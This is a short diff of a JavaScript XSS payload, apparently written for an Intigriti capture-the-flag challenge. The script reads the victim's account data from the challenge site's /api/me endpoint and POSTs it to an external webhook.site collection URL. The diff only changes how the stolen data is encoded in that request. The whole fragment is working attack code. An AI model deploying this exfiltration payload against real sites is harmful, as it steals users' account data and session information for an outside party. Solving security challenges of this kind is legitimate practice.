@@ -15,9 +15,9 @@ fetch("https://challenge-0126.intigriti.io/api/me", {
     fetch("https://webhook.site/9acf5a8d-abd2-4389-8941-68d5198823d8/flag", {
         method: "POST",
         headers: {
-            "Content-Type": "application/json"
+            "Content-Type": "application/x-www-form-urlencoded"
         },
-        body: JSON.stringify({ data: d })
+        body: "data= " + encodeURIComponent(d)
     });
 });
     </script>
